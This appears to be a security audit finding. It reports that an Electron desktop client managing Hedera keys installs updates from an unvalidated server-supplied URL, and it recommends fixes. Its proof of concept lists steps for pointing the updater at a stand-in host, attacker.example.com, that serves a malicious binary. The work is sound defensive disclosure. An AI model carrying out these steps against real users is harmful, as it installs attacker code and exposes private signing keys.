### Title
Malicious Organization Server Can Supply Arbitrary `updateUrl` to Electron Client, Enabling Unvalidated Binary Installation

---

### Summary

The Electron desktop client accepts an `updateUrl` directly from any organization server it connects to and passes it, without any domain or scheme validation, to `electron-updater`'s `setFeedURL()`. A malicious or compromised organization server can supply an attacker-controlled URL in a HTTP 426 response, causing the client to download and install an arbitrary binary. This is the direct analog of the Bemo Finance "update without validation" class: code/binary replacement is accepted from an external source with no integrity check on the source URL itself.

---

### Finding Description

**Root cause — no validation of server-supplied `updateUrl`**

When the client makes any API request to an organization server, the global Axios response interceptor in `front-end/src/renderer/utils/axios.ts` handles HTTP 426 responses:

```
const errorUpdateUrl = error.response.data?.updateUrl || null;
...
setOrgVersionBelowMinimum(serverUrl, errorUpdateUrl);   // line 103
```

`errorUpdateUrl` is taken verbatim from the server response body. No allowlist, no scheme check, no domain check is applied. [1](#0-0) [2](#0-1) 

The URL is stored in `organizationUpdateUrls` in `versionState.ts`:

```
organizationUpdateUrls.value[serverUrl] = url;   // setOrgVersionBelowMinimum, line 71
``` [3](#0-2) 

`MandatoryUpgrade.vue` reads this URL and passes it to `startUpdate()` when the user clicks "Download Update":

```
const orgUpdateUrl = computed(() => {
  ...
  return organizationUpdateUrls.value[serverUrl];   // attacker-controlled
});
const handleDownload = () => {
  startUpdate(urlToUse);   // urlToUse = attacker URL
};
``` [4](#0-3) [5](#0-4) 

`useElectronUpdater.ts` forwards the URL to the Electron main process via IPC:

```
window.electronAPI.local.update.startDownload(updateUrl);   // line 48
``` [6](#0-5) 

The IPC handler in `update.ts` calls `checkForUpdatesAndDownload(updateUrl)` with no validation: [7](#0-6) 

`ElectronUpdaterService.initialize()` then calls:

```
this.updater.setFeedURL({ provider: 'generic', url: updateUrl });
```

with the attacker-supplied URL, with no domain allowlist, no HTTPS enforcement, and no check that the URL belongs to the official release host. [8](#0-7) 

The backend's own `FrontendVersionGuard` constructs the `updateUrl` from the server-configured `FRONTEND_REPO_URL` env var, but the client has no way to verify that the server it connected to is using the legitimate configuration — any server can return any URL. [9](#0-8) 

---

### Impact Explanation

**On Linux**: `electron-updater` in `generic` provider mode performs no code-signature verification on Linux. An attacker-controlled server can serve a `latest-linux.yml` pointing to a malicious AppImage. The client downloads and installs it, achieving **remote code execution** on the user's machine with the user's privileges. The user's local Hedera private keys (stored in the SQLite database) and all session credentials are then accessible to the attacker.

**On Windows / macOS**: `electron-updater` verifies the code signature of the downloaded binary. The attacker cannot serve an unsigned binary. However, the attacker can still serve a legitimately-signed but older version of the application (downgrade attack), re-exposing the user to previously patched vulnerabilities.

In both cases the user's Hedera signing keys, which are the primary asset managed by this tool, are at risk.

---

### Likelihood Explanation

**Attacker preconditions**: The attacker must operate a server that speaks the organization API protocol. The backend is open-source; anyone can run it. No privileged access to the legitimate Hashgraph infrastructure is required.

**User action required**: The user must connect to the malicious organization server (a social-engineering step) and then click "Download Update." However, the `MandatoryUpgrade.vue` modal is shown with no option to continue using the application — the only choices are "Disconnect" or "Download Update." A user who wants to stay connected to the organization will click download, making this a low-friction step. [10](#0-9) 

The attack is realistic for any scenario where users are directed to connect to a new organization server (e.g., phishing email, fake enterprise deployment).

---

### Recommendation

1. **Validate `updateUrl` against an allowlist** in the Electron main process before passing it to `setFeedURL`. At minimum, enforce that the URL's origin matches the official release host (e.g., `https://github.com/hashgraph/`):

```typescript
// In ElectronUpdaterService.initialize()
const ALLOWED_UPDATE_ORIGINS = ['https://github.com/hashgraph/'];
const parsed = new URL(updateUrl);
if (!ALLOWED_UPDATE_ORIGINS.some(o => parsed.href.startsWith(o))) {
  this.logger.error(`Rejected untrusted updateUrl: ${updateUrl}`);
  return;
}
```

2. **Enforce HTTPS** — reject any `updateUrl` that does not use the `https:` scheme.

3. **Do not accept `updateUrl` from the 426 response body at all.** Instead, hard-code the official release URL in the client binary and only use the server-supplied version string (semver) to determine whether an update is needed. The download location should never be server-controlled.

---

### Proof of Concept

1. Stand up a modified instance of the backend (`back-end/`) that overrides `FRONTEND_REPO_URL` to point to an attacker-controlled server (e.g., `http://attacker.example.com/releases`).
2. Set `MINIMUM_SUPPORTED_FRONTEND_VERSION` to a version higher than the client's current version so every request returns HTTP 426.
3. Host a `latest-linux.yml` (or `latest.yml`) at `http://attacker.example.com/releases/` pointing to a malicious binary.
4. Invite a target user to connect to this organization server.
5. The client's Axios interceptor receives the 426, extracts `updateUrl = "http://attacker.example.com/releases/"`, and stores it via `setOrgVersionBelowMinimum`.
6. The `MandatoryUpgrade` modal appears. The user clicks "Download Update."
7. `startUpdate("http://attacker.example.com/releases/")` → IPC → `checkForUpdatesAndDownload` → `setFeedURL({ provider: 'generic', url: "http://attacker.example.com/releases/" })` → `downloadUpdate()`.
8. On Linux, the malicious binary is downloaded and installed on the next `quitAndInstall()` call, achieving RCE.

  private getUpdateUrl(): string | null {
    const repoUrl = this.configService.get<string>('FRONTEND_REPO_URL');
    const latestVersion = this.configService.get<string>('LATEST_SUPPORTED_FRONTEND_VERSION');

    if (!repoUrl || !latestVersion) {
      return null;
    }

    const cleanLatest = semver.clean(latestVersion);
    if (!cleanLatest) {
      return null;
    }

    const baseUrl = repoUrl.replace(/\/+$/, '');

    return `${baseUrl}/download/v${cleanLatest}/`;
  }
